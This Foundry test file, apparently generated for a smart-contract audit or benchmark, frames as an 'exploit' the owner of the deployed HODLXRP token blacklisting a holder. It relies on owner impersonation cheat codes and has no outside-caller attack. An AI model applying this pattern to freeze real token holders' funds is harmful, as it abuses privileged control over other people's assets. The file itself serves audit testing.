// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// We need the HODLXRP interface for type-safe calls
interface IHODLXRP {
    function getOwner() external view returns (address);
    function lpPair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function enableTrading() external;
    function setBlacklistEnabled(address account, bool enabled) external;
    function isBlacklisted(address account) external view returns (bool);
    function setInitializers(address aInitializer, address cInitializer) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x32Ef0cE6078cfdEF67f3E21D40d3eE9D437A7B06;
    address attacker = address(this);
    address owner;
    address victim;
    // No additional state variables needed

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get the current owner of the contract
        owner = IHODLXRP(TARGET).getOwner();

        // Label addresses for debugging
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "HODLXRP Token");

        // Create a victim address
        victim = address(0x999);
        vm.label(victim, "Victim Address");

        // Impersonate the owner for the entire setup
        vm.startPrank(owner);

        // First, we need to ensure the antiSnipe contract is set
        // The contract has setInitializers() function that needs to be called before trading
        // However, looking at the code, if antiSnipe is address(0), it sets to address(this) in enableTrading()
        // So we can proceed with enableTrading()

        // We need to simulate liquidity being added
        // According to _checkLiquidityAdd(), _hasLiqBeenAdded becomes true when:
        // 1. !_hasLimits(from, to) - which means from or to is owner, liquidityHolders, etc.
        // 2. to == lpPair
        // We can simulate this by transferring tokens to the LP pair as the owner
        address lpPair = IHODLXRP(TARGET).lpPair();
        vm.label(lpPair, "LP Pair");

        // Transfer some tokens to LP pair to simulate liquidity
        uint256 ownerBalance = IHODLXRP(TARGET).balanceOf(owner);
        IHODLXRP(TARGET).transfer(lpPair, ownerBalance / 100); // Transfer 1% to LP

        // Now enable trading
        IHODLXRP(TARGET).enableTrading();

        // Transfer some tokens to victim so they have something to potentially sell
        IHODLXRP(TARGET).transfer(victim, 1000 * 10**18); // 1000 tokens

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Now we demonstrate the owner privilege abuse
        // Impersonate the owner again to blacklist the victim
        vm.startPrank(owner);

        // Call the vulnerable function to blacklist the victim
        IHODLXRP(TARGET).setBlacklistEnabled(victim, true);

        vm.stopPrank();

        // Verify the victim is now blacklisted
        bool isBlacklisted = IHODLXRP(TARGET).isBlacklisted(victim);
        require(isBlacklisted, "Victim should be blacklisted");

        // Also verify the victim still has tokens (precondition)
        uint256 victimBalance = IHODLXRP(TARGET).balanceOf(victim);
        require(victimBalance > 0, "Victim should have tokens");

        // Verify trading is enabled
        // Note: There's no public getter for tradingEnabled, but we can infer from the fact
        // that enableTrading() was called successfully

        console.log("Victim address:", victim);
        console.log("Victim balance:", victimBalance);
        console.log("Is victim blacklisted:", isBlacklisted);

        // The oracle check would be: assertEq(isBlacklisted, true);
        assertEq(isBlacklisted, true, "Logic Exploit Failed: State not tampered");
    }

    // No helper functions needed
    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

